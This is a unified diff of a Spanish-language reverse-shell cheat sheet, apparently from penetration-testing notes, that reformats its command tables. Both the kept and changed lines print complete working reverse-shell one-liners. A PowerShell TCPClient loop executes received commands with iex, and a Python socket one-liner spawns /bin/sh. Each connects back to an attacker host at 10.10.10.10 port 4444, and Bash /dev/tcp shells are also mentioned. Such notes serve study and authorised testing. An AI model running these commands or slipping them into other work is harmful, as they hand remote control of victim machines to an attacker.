@@ -661,11 +661,12 @@ En sistemas basados en Unix/Linux, es posible ejecutar un reverse shell usando s
 - **/dev/tcp**: Es una forma especial en Linux para crear conexiones de red directamente desde Bash.
 
 ## Powershell Reverse Shell
+
 En sistemas Windows, se puede usar PowerShell para obtener un reverse shell de manera bastante discreta:
 
-| **Comando**                                                                                  | **Descripción**                                                           |
-|----------------------------------------------------------------------------------------------|---------------------------------------------------------------------------|
-| `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object Text.Encoding).GetString($bytes, 0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte, 0, $sendbyte.Length);$stream.Flush()}"` | Utiliza PowerShell para crear una conexión de red inversa y ejecutar comandos remotos en la máquina víctima. |
+| **Comando**                                                                                                                                                                                                 |
+|-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
+| `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object Text.Encoding).GetString($bytes, 0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte, 0, $sendbyte.Length);$stream.Flush()}"` |
 
 ### Explicación:
 - **Powershell**: Utiliza las capacidades de red de PowerShell para conectarse al host atacante y ejecutar comandos en la máquina víctima.
@@ -674,8 +675,8 @@ En sistemas Windows, se puede usar PowerShell para obtener un reverse shell de m
 ## Reverse Shell en Python
 También es posible crear un reverse shell utilizando Python, muy útil si Python está disponible en el sistema:
 
-| **Comando**                                                                                     | **Descripción**                                                         |
-|-------------------------------------------------------------------------------------------------|-------------------------------------------------------------------------|
+| **Comando**                                                                                     | 
+|-------------------------------------------------------------------------------------------------|
 | `python -c 'import socket, subprocess, os; s=socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect(("10.10.10.10",4444)); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); p=subprocess.call(["/bin/sh", "-i"]);'` | Reverse shell en Python que conecta al atacante en `10.10.10.10` en el puerto `4444`. |
 
 ### Explicación:
